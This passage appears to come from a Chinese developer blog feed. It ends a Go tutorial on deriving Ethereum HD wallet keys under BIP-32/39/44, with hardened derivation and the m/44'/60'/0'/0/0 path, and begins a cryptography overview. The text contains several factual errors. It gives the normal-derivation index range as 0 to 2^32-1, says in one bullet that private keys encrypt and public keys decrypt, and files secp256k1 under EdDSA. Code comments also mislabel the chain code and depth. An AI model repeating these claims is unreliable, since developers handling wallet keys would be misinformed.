class="hljs-type">byte</span>)</span></span> (*Key, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// Generate key and chaincode</span><br>hmac := hmac.New(sha512.New, []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;Bitcoin seed&quot;</span>))<br>_, err := hmac.Write(seed)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>intermediary := hmac.Sum(<span class="hljs-literal">nil</span>)<br><br><span class="hljs-comment">// Split it into our key and chain code</span><br>keyBytes := intermediary[:<span class="hljs-number">32</span>]<br>chainCode := intermediary[<span class="hljs-number">32</span>:]<br><br><span class="hljs-comment">// Validate key</span><br>err = validatePrivateKey(keyBytes)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// Create the key struct，注意这个返回的key结构体，</span><br>key := &amp;Key&#123;<br>Version:     PrivateWalletVersion,<br>ChainCode:   chainCode,<br>Key:         keyBytes,<br>Depth:       <span class="hljs-number">0x0</span>,<br>ChildNumber: []<span class="hljs-type">byte</span>&#123;<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>&#125;,<br>FingerPrint: []<span class="hljs-type">byte</span>&#123;<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>&#125;,<br>IsPrivate:   <span class="hljs-literal">true</span>,<br>&#125;<br><br><span class="hljs-keyword">return</span> key, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>首先，上面的从种子生成主账户私钥用到的就是<code>BIP-32</code>标准。BIP-32提出了<strong>分层确定性钱包（HD Wallet）</strong>的标准，它允许从单个种子(Seed)生成一系列相关的密钥对，报考一个主账户秘钥和无线多个子账户秘钥，不同的子账户之间具有层次关系，形成了<strong>以主账户为根节点的树形结构</strong>：</p><p>图片</p><p>由图看出，BIP-39解决熵源生成助记词—&gt;助记词生成种子（Seed）</p><p>第二部分 BIP-32这部分的<strong>分层确定性钱包</strong>（HD Wallet），</p><ul><li><p><strong>分层</strong>：分层的意思是树形结构，每一岑都有一个序号（从0开始），主账户秘钥master序号就是0，一次类推，这个叫做索引号（32位）</p></li><li><p><strong>确定性</strong>：当通过单向哈希函数派生子密钥的时候，因为即想要随机，又希望同一个父秘钥每次生成的子密钥都相同，于是，引入了<strong>链码</strong>来保证确定性，使得每次生成子密钥都是由 <strong>父秘钥 + 父链码 + 索引号</strong> 三个一起派生<strong>子密钥</strong></p></li><li><p><strong>钱包</strong>：钱包就对应密钥（私钥+公钥）</p></li></ul><p>重点：HD Wallet 的所有账户都是由 <strong>秘钥、链码、索引号（32位）</strong>三个部分组成的</p><p>所以当派生子密钥的时候，只有单独的私钥还是不行的，必须是<strong>私钥加上链码</strong>一起才能<strong>派生</strong>对应索引的子私钥，因此私钥和链码放在一起也叫做<strong>扩展私钥</strong>，为啥？因为是可拓展的，同样的，公钥和链码放一起叫做<strong>扩展公钥</strong>，接下里看下主账户<strong>拓展私钥masterKey</strong>来派生子账户（注意哦，主私钥+链码&#x3D;拓展私钥）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 由主账户私钥生成子账户私钥</span><br><span class="hljs-comment">// @参数 索引号</span><br>childKey1, _ := masterKey.NewChildKey(<span class="hljs-number">1</span>)<br>fmt.Println(<span class="hljs-string">&quot;childKey1:&quot;</span>, childKey1)<br><br><span class="hljs-comment">// 派生第二个子账户</span><br>childKey2, _ := masterKey.NewChildKey(<span class="hljs-number">2</span>)<br>fmt.Println(<span class="hljs-string">&quot;childKey2:&quot;</span>, childKey2)<br><span class="hljs-comment">// 输出结果,可以看到开头是xprv开头的，</span><br><span class="hljs-comment">//childKey1: xprv9vmc7bbX7qbvBfGPKLctPka9JcchdCkwh9NrxPdVjZfGjLyM3RHGsTWwyrXGr86ADJDanyrMKLhJNbuua5fC5tv7XPVF4zBDoQiNYN69rFP</span><br><span class="hljs-comment">// childKey2: xprv9vmc7bbX7qbvEwJfuMa9S1K9F1iuMTeaAaYcbg7NLVGViM6VTbyPecWXiMG37QgKrS4Myz9d9N5QjTmbTgAjFZzsdwGaWuhnBMewz2mFCKd</span><br><br></code></pre></td></tr></table></figure><p>这里看一下NewChildKey方法内部逻辑</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// NewChildKey derives a child key from a given parent as outlined by bip32</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(key *Key)</span></span> NewChildKey(childIdx <span class="hljs-type">uint32</span>) (*Key, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// Fail early if trying to create hardned child from public key</span><br><span class="hljs-keyword">if</span> !key.IsPrivate &amp;&amp; childIdx &gt;= FirstHardenedChild &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, ErrHardnedChildPublicKey<br>&#125;<br><br>intermediary, err := key.getIntermediary(childIdx) <span class="hljs-comment">// 这个方法内部通过 `父密钥`+`父链码`+`索引号`派生了子密钥</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// Create child Key with data common to all both scenarios</span><br>childKey := &amp;Key&#123;<br>ChildNumber: uint32Bytes(childIdx),<br>ChainCode:   intermediary[<span class="hljs-number">32</span>:], <span class="hljs-comment">// 索引号，intermediary数组右边的32位</span><br>Depth:       key.Depth + <span class="hljs-number">1</span>, <span class="hljs-comment">// 这里就是链码</span><br>IsPrivate:   key.IsPrivate,<br>&#125;<br>    ........<br>    childKey.Key = addPrivateKeys(intermediary[:<span class="hljs-number">32</span>], key.Key) <span class="hljs-comment">// 子密钥，intermediary数组的左边32位</span><br><br><br><span class="hljs-keyword">return</span> childKey, <span class="hljs-literal">nil</span> <span class="hljs-comment">//  返回出去</span><br></code></pre></td></tr></table></figure><p>代码总结：派生出的字节数组 左边32字节是秘钥，右边32字节就是链码</p><p>除了通过拓展私钥派生出子私钥，还可以通过拓展公钥派生出子公钥。不过需要注意的是：<strong>公钥只能派生出子公钥，无法派生出子私钥</strong>。下面验证一下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 用主账户公钥 派生 子账户公钥（没有私钥）</span><br>publicKey := masterKey.PublicKey() <span class="hljs-comment">// 这里是拿到主账户公钥，待会下面会派生</span><br>fmt.Println(<span class="hljs-string">&quot;publicKey:&quot;</span>, publicKey)<br><br>PubKeyToChild, _ := publicKey.NewChildKey(<span class="hljs-number">1</span>) <span class="hljs-comment">// 通过主账户公钥派生出子账户公钥</span><br>fmt.Println(<span class="hljs-string">&quot;PubKeyToChild:&quot;</span>, PubKeyToChild)<br><span class="hljs-comment">// 输出</span><br><span class="hljs-comment">// publicKey: xpub661MyMwAqRbcEkC8JkXwGBm4jX1FmphgcYjyhnKXbW4QKA1DAX5V1Hp6SoCKev4Gim8AqSYzM7ZCttjsHb7SNSH4ufkgsWGVupS73DLxr7Z</span><br><span class="hljs-comment">// PubKeyToChild: xpub68shoUguHPvUVptKbW1BrWa1eAvX5rVKUEQ8S9e3fPVvr5EVhXkVBbNvKJBFR1TqFrmqRERkELB6tixWjc8VouZz3HZRCq2YZBnoLsEfkdx</span><br><br><span class="hljs-comment">// 用主账户私钥，派生出子账户私钥，再生产子账户公钥，然后判断一下是否一致</span><br>childKey1, _ := masterKey.NewChildKey(<span class="hljs-number">1</span>) <span class="hljs-comment">// 派生子账户1</span><br>publicKey1 := childKey1.PublicKey() <span class="hljs-comment">// 从子账户1的秘钥恢复出公钥来，</span><br>fmt.Println(<span class="hljs-string">&quot;publicKey3:&quot;</span>, publicKey1) <span class="hljs-comment">// 打印下这个子账户1公钥</span><br>fmt.Println(bytes.Equal(PubKeyToChild.Key, publicKey1.Key)) <span class="hljs-comment">// 返回的ture，和签名我们生成的是一样的</span><br><span class="hljs-comment">// publicKey3: xpub68shoUguHPvUVptKbW1BrWa1eAvX5rVKUEQ8S9e3fPVvr5EVhXkVBbNvKJBFR1TqFrmqRERkELB6tixWjc8VouZz3HZRCq2YZBnoLsEfkdx</span><br><br></code></pre></td></tr></table></figure><p>首先再重复一下，要明确的是，公钥只能派生子公钥，无法派生出子私钥，但是私钥确可以推出公钥</p><p>就会有<strong>2种派生方式</strong>：</p><ul><li>1、拓展公钥（公钥+链码）父公钥&#x3D;&#x3D;&gt; 子公钥，子私钥另外由父私钥派生，不归公钥管</li><li>2、拓展私钥（私钥+链码）父私钥&#x3D;&#x3D;&#x3D;&gt;子私钥 &#x3D;&#x3D;&#x3D;&gt; 子公钥</li></ul><p>第一种方式好处就是：可以用父公钥暴露在外面，然后可以派生出n多个子公钥用于接收资产，因为没有私钥，所以只能接收，不能花费（签名）所以很安全，与此同时，在另一个地方用子私钥来控制资产（签名），这样就做到了<strong>子公钥和子私钥的解耦</strong>，</p><p>但是这样的派生方式有很大的危险，就是如果有人拿到了这个子私钥，那么则可以通过子私钥+父链码来推导出父私钥，父私钥拿到了就可以加上其他的链码来推导其他姊妹账户，于是就出现了<strong>强化派生（Hardened derivation）</strong>强化派生限制了父公钥派生出子公钥的能力，只能使用第二种派生也就是 <strong>父私钥&#x3D;&#x3D;&#x3D;&gt;子私钥&#x3D;&#x3D;&#x3D;&gt;子公钥</strong></p><blockquote><p>HD Wallet 有规定：</p><p>索引号在0到2^32-1(0x0 to 0x7FFFFFFF)之间只用于常规派生</p><p>索引号在2^31到2^32-1(0x80000000 to 0xFFFFFFFF)之间只用于强化派生</p></blockquote><p>PS：<strong>在表示中，强化派生密钥右上角有一个小撇号，如：索引号为 0x80000000 就表示为 0’</strong></p><p>接下来回头去看下上面的派生子密钥的源码，也就是上面的NewchildKey方法，里面有一个判断，就是判断你的入参childIdx 是在哪个索引范围，如果是在强化派生的索引范围，就是强化派生，就不允许公钥派生</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(key *Key)</span></span> NewChildKey(childIdx <span class="hljs-type">uint32</span>) (*Key, <span class="hljs-type">error</span>) &#123;<br>    <span class="hljs-comment">// Fail early if trying to create hardned child from public key</span><br>    <span class="hljs-comment">// 这里就可以看到，如果这个childIdx &gt;= FirstHardenedChild 就会返回空且抛出错误</span><br>    <span class="hljs-keyword">if</span> !key.IsPrivate &amp;&amp; childIdx &gt;= FirstHardenedChild &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, ErrHardnedChildPublicKey<br>    &#125;<br>    .....<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来就是由公钥去生成地址了，这里就是签名提到的压缩的过程，这个简单不需要额外理解，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 由公钥推出地址（解压缩的过程，就是转化然后去头去尾的）</span><br><span class="hljs-comment">// 先解压缩公钥，再去推地址</span><br>pubKey1, _ := crypto.DecompressPubkey(PubKeyToChild.Key)<br><span class="hljs-comment">// 生成子账户地址</span><br>addre1 := crypto.PubkeyToAddress(*pubKey1)<br>fmt.Println(<span class="hljs-string">&quot;addre1:&quot;</span>, addre1)<br></code></pre></td></tr></table></figure><p><strong>但是！但是！但是！</strong> 你现在走到这一步，还是不可以导入到metaMask钱包里面的。需要继续往下走</p><h4 id="分层确定性钱包（HD-Wallet）的标准路径"><a href="#分层确定性钱包（HD-Wallet）的标准路径" class="headerlink" title="分层确定性钱包（HD Wallet）的标准路径"></a>分层确定性钱包（HD Wallet）的标准路径</h4><p>还记得本文开头提出的那个问题吗？</p><p>path的<code>&quot;m/44&#39;/60&#39;/0&#39;/0&quot;</code> 都是什么意思？现在你知道了，右上角的小撇号代表强化派生，现在来看其他部分。</p><p>BIP-44 确定了 HD 钱包的标准路径。由于 HD 钱包的树状结构，每一层有 40 亿个子密钥（20 亿个常规子密钥和 20 亿个强化子密钥），层数可以无限扩展，没有尽头。</p><p>导致钱包里账户的路径可能性是无穷的，假设你想从 metamask 更换到另一个不同的钱包应用，就会存在兼容性问题。</p><p>于是乎，<strong>BIP-44</strong> 定义了标准，只要遵循了这个标准的钱包之间都是兼容的。好消息是，包括 metamask 在内的许多钱包，都遵循了这个标准，第三个BIP来了，签名助记词是BIP39，种子是BIP32</p><p>BIP-44 标准的钱包路径（path）参数：m &#x2F; purpose’ &#x2F; coin_type’ &#x2F;account’ change &#x2F; address_index</p><ul><li>m ：标记子账户都是主私钥派生而来的。</li><li>purpose’ ：标记是 BIP-44, 固定值是 44’</li><li>coin_type’ ：标记账户类型，从 0’ 开始，用于给账户分类&#x3D;&#x3D;&#x3D;&gt; <a href="https://github.com/satoshilabs/slips/blob/master/slip-0044.md">完整的币种类型</a></li><li>change  ：0 外部可见地址，1 找零地址（外部不可见），通常默认0</li><li>address_index ：地址索引</li></ul><p><strong>注意：为了保护主私钥安全，所有主私钥派生的第一级账户，都采用强化派生。</strong> </p><p>但是，你可以使用<code>m/0</code>，<code>m/1&#39;/0</code>，<code>m/0&#39;/1/2/3</code>这种任何路径你都可以随便输入，派生出来的都是正确的账户，只是这些不符合标准的钱包不一定能兼容的了这些链，且安全性不可知，所以统一准信行业标准（BIP-44）</p><h3 id="实现一个以太坊的钱包（一个符合BIP-44标准的路径path）"><a href="#实现一个以太坊的钱包（一个符合BIP-44标准的路径path）" class="headerlink" title="实现一个以太坊的钱包（一个符合BIP-44标准的路径path）"></a>实现一个以太坊的钱包（一个符合BIP-44标准的路径path）</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 所以这个masterKey 的来源还要再写一遍</span><br>助记词==&gt;种子==&gt; 主私钥masterKey<br><span class="hljs-comment">// 这里的masterKey是什么？是主私钥，然后主私钥经过各种派生之后，生成的子私钥</span><br><span class="hljs-comment">// 以太坊的币种类型是60</span><br><span class="hljs-comment">// FirstHardenedChild = uint32(0x80000000) 是一个常量</span><br><span class="hljs-comment">// 以路径（path: &quot;m/44&#x27;/60&#x27;/0&#x27;/0/0&quot;）为例</span><br>key, _ := masterKey.NewChildKey(bip32.FirstHardenedChild + <span class="hljs-number">44</span>)  <span class="hljs-comment">// 这一步是在做强化派生， 对应 purpose&#x27; 44是符合BIP-44标准</span><br>key, _ = key.NewChildKey(bip32.FirstHardenedChild + <span class="hljs-type">uint32</span>(<span class="hljs-number">60</span>)) <span class="hljs-comment">// 还是强化派生，对应 coin_type类型60&#x27;</span><br>key, _ = key.NewChildKey(bip32.FirstHardenedChild + <span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))  <span class="hljs-comment">// 还是强化派生，对应account</span><br>key, _ = key.NewChildKey(<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))                             <span class="hljs-comment">// 常规派生，对应 change</span><br>key, _ = key.NewChildKey(<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))                             <span class="hljs-comment">// 常规派生，对应的 address_index</span><br><br><span class="hljs-comment">// path已经完毕，生成地址</span><br>ethPublicKey, _ := crypto.DecompressPubkey(key.PublicKey().Key)<br>fmt.Println(<span class="hljs-string">&quot;ethPublicKey:&quot;</span>, ethPublicKey)<br>ethAddre := crypto.PubkeyToAddress(*ethPublicKey).Hex()<br>fmt.Println(<span class="hljs-string">&quot;ethAddre:&quot;</span>, ethAddre)<br><span class="hljs-comment">// 尝试打印一下这个key的私钥算</span><br>fmt.Println(<span class="hljs-string">&quot;key:&quot;</span>, key.Key)                 <span class="hljs-comment">// 这个时候你直接打印Key是十进制的字节切片</span><br>privateKeyHex := hex.EncodeToString(key.Key) <span class="hljs-comment">// 这里在做的就是转化成16进制的字符，</span><br>fmt.Println(<span class="hljs-string">&quot;key:&quot;</span>, privateKeyHex)<br></code></pre></td></tr></table></figure><p>所以这里总结一下，助记词–私钥–公钥–地址，这个过程中做了什么？</p><p><img src="/img/web3/privatekeyprocess.png" alt="privatekeyprocess"></p>]]></content>
    
    
    <categories>
      
      <category>blockChain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>block</tag>
      
      <tag>实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>03 密码学</title>
    <link href="/2024/05/23/03%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    <url>/2024/05/23/03%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="1-公钥密码学理论"><a href="#1-公钥密码学理论" class="headerlink" title="1 公钥密码学理论"></a>1 公钥密码学理论</h1><blockquote><p>两种加密方式：对称加密和非对称加密</p></blockquote><h2 id="1-1-对称加密"><a href="#1-1-对称加密" class="headerlink" title="1.1 对称加密"></a>1.1 对称加密</h2><p>区别：主要区别就是密钥对的区别</p><p>对称加密（单秘钥加密），<strong>加解密都是只有一把key</strong> ，使用相同的秘钥进行加密和解密炒作</p><p>发送方使用密钥对数据进行加密，接收方使用相同的密钥对密文进行解密，从而还原出原始的明文数据。</p><p>比较有名的是 DES 3DES AES TDEA blowful rc245</p><p>对称加密的特点包括：</p><ol><li><strong>速度和效率</strong>: 对称加密使用相同的密钥进行加密和解密，因此加密和解密的过程非常快速和高效。</li><li><strong>简单性</strong>: 对称加密算法相对简单，实现起来较为容易。</li><li><strong>适用于大数据量</strong>: 对称加密适用于大数据量的加密和解密，因为它的处理速度较快。</li><li><strong>密钥管理</strong>: 对称加密需要确保密钥的安全性，因为任何拥有密钥的人都可以对数据进行解密。因此，对称加密在密钥的生成、分发和管理方面需要特别注意。</li><li><strong>密钥分发</strong>: 密钥的安全分发是对称加密的一个挑战。发送方和接收方必须事先共享密钥，这要求在安全可靠的通信渠道上进行密钥交换。</li></ol><h2 id="1-2-非对称加密"><a href="#1-2-非对称加密" class="headerlink" title="1.2 非对称加密"></a>1.2 非对称加密</h2><p>非对称加密 （公钥密码学、<strong>双密码加密</strong>。现在的加密体系），</p><p>双秘钥是哪两个？：</p><ul><li><p><strong>privatekey</strong> ：私有,进行加密（俗称私钥）私钥是用于解密的密钥，必须保密，并且只有密钥的持有者可以使用私钥进行解密。私钥用于解密公钥加密的数据。</p></li><li><p><strong>publickey</strong>：公开的，所有人都知道，进行解密（俗称公钥）公钥是用于加密的密钥，可以公开分享给其他人。任何人都可以使用公钥对数据进行加密，但无法使用公钥进行解密。</p></li></ul><p>非对称加密的运作过程如下：</p><ul><li>发送方使用接收方的公钥对数据进行加密。</li><li>加密后的数据通过不安全的通信渠道发送给接收方。</li><li>接收方使用自己的私钥对收到的密文进行解密，得到原始的明文数据。</li></ul><p>非对称加密的特点包括：</p><ol><li><strong>安全性</strong>: 非对称加密提供了更高的安全性，因为公钥用于加密数据，而私钥用于解密数据。即使公钥被公开获取，也无法轻易破解密文，因为只有私钥持有者才能解密数据。</li><li><strong>密钥分发</strong>: 非对称加密解决了密钥分发的问题。发送方只需获取接收方的公钥，而无需共享私钥。这使得非对称加密在保护数据传输的同时，简化了密钥管理的复杂性。</li><li><strong>数字签名</strong>: 非对称加密还可以用于数字签名，即使用私钥对数据进行加密，证明数据的完整性和认证发送方身份。接收方可以使用发送方的公钥进行验证。</li><li><strong>计算复杂性</strong>: 相对于对称加密，非对称加密的计算复杂性较高，处理速度较慢。因此，非对称加密通常用于加密小数据量或者进行密钥交换，而不是对大量数据进行加密</li></ol><p>非对称加密比较有名的是：RSA  ECC（椭圆曲线）GPG（用过，加密文件）</p><p>ECC分支：</p><ul><li>ECDSA  <strong>特别算法Secp256K1</strong>啥的</li><li>EDDSA <strong>特别算法Ed25519</strong>啥的</li></ul><h1 id="2-对称密码学系列"><a href="#2-对称密码学系列" class="headerlink" title="2.对称密码学系列"></a>2.对称密码学系列</h1><h2 id="2-1-DES"><a href="#2-1-DES" class="headerlink" title="2.1. DES"></a>2.1. DES</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol><li>秘钥长度：<strong>56</strong>位</li><li>分组密码：处理64位的分组数据</li><li>加密和解密都需要同一把私钥</li><li>16轮加密包含：拓展、置换、S盒替代、再次置换（16轮加密流程可以了解下）</li><li>安全性：已被攻破，实际项目不会用，</li><li>复杂性和速度。</li><li>3DES替换，目前还安全</li></ol><p> 安全性：特别经典，但已被攻破</p><h2 id="2-2-3DES"><a href="#2-2-3DES" class="headerlink" title="2.2. 3DES"></a>2.2. 3DES</h2><p>3DES就是3重DES加密，目前也不用了，现在主流都是<strong>AES</strong>，</p><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ol><li>秘钥长度：56位，由于引入了对称秘钥的3次应用，所以实际秘钥长度是3个56，</li><li>分组密码：处理64位的分组数据</li><li>加密和解密都需要同一把私钥</li><li>3个16轮加密包含：拓展、置换、S盒替代、再次置换（16轮加密流程可以了解下）</li><li>安全性：比DES高的多，目前是安全的。</li><li>复杂性和速度性能会有损耗。</li></ol><h2 id="2-3-AES："><a href="#2-3-AES：" class="headerlink" title="2.3.AES："></a>2.3.AES：</h2><h3 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h3><ol><li>秘钥长度：比较灵活，可以是128位 192位 256位</li><li>分组密码：128位的分组密码（分组的意思就是如果数据块太长了，就只能按照128位去分组，分完组之后再加密）</li><li>加密和解密都需要同一把私钥</li><li>基于置换和代换网络，轮数取决于秘钥长度：AES-128使用10轮加密，AES-192使用12轮加密，AES-256使用14轮加密。通过增加轮数，AES提供了更高的安全级别，每一轮都有初始轮、主要轮、最终轮，主要轮都有四个步骤：字节替代（SubBytes）、行移位（ShiftRows）、列混淆（MixColumns）和轮密钥加（AddRoundKey），</li><li>安全性：目前是安全的，没被破解</li><li>应用：文件加密解密，数据加密解密，</li></ol><h2 id="2-4-DES-、3DES、AES-对比"><a href="#2-4-DES-、3DES、AES-对比" class="headerlink" title="2.4. DES 、3DES、AES 对比"></a>2.4. DES 、3DES、AES 对比</h2><h3 id="共同点："><a href="#共同点：" class="headerlink" title="共同点："></a>共同点：</h3><ol><li>单秘钥对称加密</li><li>分组密码</li><li>都有多轮</li></ol><h3 id="不同点："><a href="#不同点：" class="headerlink" title="不同点："></a>不同点：</h3><ol><li>DES已被破解</li><li>3DES是DES的补充，安全性有保障，实际应用少，</li><li>DES（64位）和AES（128、192、256）秘钥长度不一样，</li><li>AES安全性好一点，目前暂未被破解。</li></ol><h3 id="应用场景："><a href="#应用场景：" class="headerlink" title="应用场景："></a>应用场景：</h3><p>文件数据加密，无法做秘钥签名，因为是单秘钥的</p><h1 id="3-非对称加密系列"><a href="#3-非对称加密系列" class="headerlink" title="3. 非对称加密系列"></a>3. 非对称加密系列</h1><h2 id="3-1-核心："><a href="#3-1-核心：" class="headerlink" title="3.1 核心："></a>3.1 核心：</h2><p>公钥加密，私钥解密。</p><p>你要发一段话给别人，就用别人公开的公钥进行加密，加密之后任何人都解不开这个秘密，除非拿到了私钥才能解开秘密得到里面的内容</p><h2 id="3-2-常用："><a href="#3-2-常用：" class="headerlink" title="3.2 常用："></a>3.2 常用：</h2><p>常用的非对称加密算发有 RSA、Elgamal、背包算法、Rabin、D-H、ECC（椭圆曲线加密算法）等。</p><p>ECC分：</p><ul><li>EDDSA-&gt;ED25519，<strong>应用</strong>：ECDSA 在 TLS&#x2F;SSL、SSH、数字签名等领域广泛应用。<ul><li>Ed25519 是一种基于 Edwards 曲线的数字签名算法，它提供了高度的安全性和性能；Ed25519 也是加密货币中使用比较广泛的签名算法，如波卡等链。（ECC变种）</li></ul></li><li>EdDSA-&gt;secp256k1，<strong>应用</strong>：EdDSA 由 Daniel J. Bernstein 等人提出，并且被应用于密码学协议中，如密码学货币、加密货币等。（ECC变种，这个是被用的最多）公钥很多都是02&#x2F;03&#x2F;04开头的<ul><li>Secp256k1 是一种椭圆曲线，常用于加密货币领域，如比特币和以太坊。</li></ul></li></ul><h2 id="3-3-ECC算法："><a href="#3-3-ECC算法：" class="headerlink" title="3.3 ECC算法："></a>3.3 ECC算法：</h2><p>**ECC(Elliptic Curve Cryptography)**：椭圆曲线密码学是一类基于椭圆曲线数学问题的非对称加密算法。相比于传统的非对称加密算法，如RSA，ECC提供了相同安全级别下更短的密钥长度和更高的计算效率，因此在资源受限的环境中得到广泛应用。</p><p>公钥用于加密</p><p>基于椭圆曲线-离散对数</p><p>秘钥长度比RSA短，短秘钥，256位的ECC安全性相当于3072位的RSA</p><p>安全高</p><p>效率高</p><p>应用场景：数字货币</p><h2 id="3-4-RSA特点："><a href="#3-4-RSA特点：" class="headerlink" title="3.4 RSA特点："></a>3.4 RSA特点：</h2><p><strong>RSA（Rivest-Shamir-Adleman</strong>）是最常用的非对称加密算法之一。它基于大数分解的困难性，使用公钥进行加密，私钥进行解密。RSA广泛应用于数据加密、数字签名和密钥交换等领域。</p><ol><li>公钥用于加密</li><li>基于数学难题（因数分解啥的）–&gt;安全性很高</li><li>秘钥长度：1024，2048，4096，秘钥越长越安全</li><li>加密解密：公钥模幂运算，私钥解密</li><li>RSA发送方使用自己的私钥签名消息，接收方用公钥验证</li><li>性能：性能慢，所以一般是对很小数据加密，</li></ol><p>应用：数字证书、签名认证，点击邮件加密，交易签名用到</p><p>场景比较多的是混合加密，</p><p>所谓混合加密就是使用在实际的应用中把对称加密和非对称加密结合起来使用。</p><p>我们都知道非对称加密算法比对称加密算法慢数千倍，但在保护通信安全方面，非对称加密算法却具有对称密码难以企及的优势。</p><p>所以在实际的应用中，都是对称加密与非对称加密混合使用。</p><p>取其优势，去其糟粕，达到完美使用的一个目的。</p><p>对称加密技术：</p><p>一一对应，加密和解密都是用一把钥匙，所以发送者和接收者手上必须同时持有钥匙</p><p>优点：这种算法比较简单且计算量比较小，对网络开放、从而能够效率高地加密。速度更快</p><p>缺点，不能保证协商秘钥过程的安全性。二是每次通信都使用唯一秘钥，秘钥越来越多不好管理。三是对称加密算法只能对数据进行加解密，保证数据的机密性，但无法验证通讯双方的真实身份，不能确定数据的完整性。</p><p>非对称密钥加密技术：</p><p>有公钥私钥两把钥匙，公钥（公布于众）用于加密数据，私钥（私密持有）用于解密数据</p><p>优点：更安全，可以一对多个接收方，简化秘钥（秘钥少）发放，支持数字签名。</p><p>缺点：计算过程特别复杂，运行数据的加密和解密速度比较慢</p><h2 id="Schnorr和BLS算法介绍"><a href="#Schnorr和BLS算法介绍" class="headerlink" title="Schnorr和BLS算法介绍"></a>Schnorr和BLS算法介绍</h2><p>Schnorr 签名和 BLS 签名在区块链技术中都有着重要的应用。</p><p>它们各自具备独特的优势，使其在不同的区块链应用场景中得到广泛使用。</p><h2 id="3-5-Schnorr-签名算法"><a href="#3-5-Schnorr-签名算法" class="headerlink" title="3.5 Schnorr 签名算法"></a>3.5 Schnorr 签名算法</h2><p>Schnorr签名广泛应用于区块链和加密货币领域</p><h3 id="3-5-1-Schnorr基本步骤"><a href="#3-5-1-Schnorr基本步骤" class="headerlink" title="3.5.1 Schnorr基本步骤"></a>3.5.1 